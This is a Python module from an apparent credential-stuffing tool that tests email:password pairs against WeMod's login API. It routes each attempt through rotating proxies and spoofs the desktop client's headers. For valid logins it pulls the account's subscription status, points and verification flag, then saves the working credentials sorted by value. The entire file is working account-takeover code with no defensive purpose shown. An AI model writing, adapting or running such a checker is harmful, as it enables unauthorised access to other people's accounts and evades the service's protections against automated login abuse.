from modules.variables import Checker
from modules.functions import bad_proxy, log,save,set_proxy
from requests import get,post

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        data = f"client_id=infinity&grant_type=password&password={password}&username={email}"
        header_1 = {
            "content-type":"application/urlencoded",
            "Host": "api.wemod.com" ,
            "Connection": "keep-alive" ,
            "Authorization": "null" ,
            "Origin": "file://" ,
            "Sec-Fetch-Dest": "empty",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) WeMod/6.3.10 Chrome/80.0.3987.165 Electron/8.2.5 Safari/537.36" ,
            "Content-Type": "application/x-www-form-urlencoded" ,
            "Accept": "*/*" ,
            "Sec-Fetch-Site": "cross-site" ,
            "Sec-Fetch-Mode": "cors" ,
            "Accept-Language": "en-US" ,
            "Accept-Encoding": "gzip, deflate" ,
            "Content-Length": "83" 
        }
        header_2 = {"Authorization": ""}
        try:
            response = post("https://api.wemod.com/auth/token",data=data,headers=header_1,proxies=proxy_set,timeout=Checker.timeout)
            if "{\"error\":\"invalid_grant\",\"" in response.text:
                retries += 1
            elif "access_token\":\"" in response.text:
                user = response.json()["user_id"]
                token = response.json()["access_token"]
                header_2["Authorization"] = f"Bearer {token}"

                capture = get(f"https://api.wemod.com/users/{user}",headers=header_2,proxies=proxy_set,timeout=Checker.timeout)
                verified = capture.json()["emailVerified"]
                points = capture.json()["points"]
                pro = capture.json()["proSubscription"]
                if pro == None:
                    if not Checker.cui:
                        log("custom",email+":"+password,"Wemod")
                    save("Wemod","custom",Checker.time,email+":"+password)
                    Checker.custom += 1
                    Checker.cpm += 1
                    return
                else:
                    active = pro["active"]
                    if active != True:
                        if not Checker.cui:
                            log("custom",email+":"+password,"Wemod")
                        save("Wemod","custom",Checker.time,email+":"+password)
                        Checker.custom += 1
                        Checker.cpm += 1
                        return
                    else:
                        expire = pro["endsAt"]
                        if not Checker.cui:
                            log("good",email+":"+password,"Wemod")
                        save("Wemod","good",Checker.time,email+":"+password+f" | Verified: {verified} | Points: {points} | Expires: {expire}")
                        Checker.good += 1
                        Checker.cpm += 1
                        return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1
    Checker.cpm += 1
    return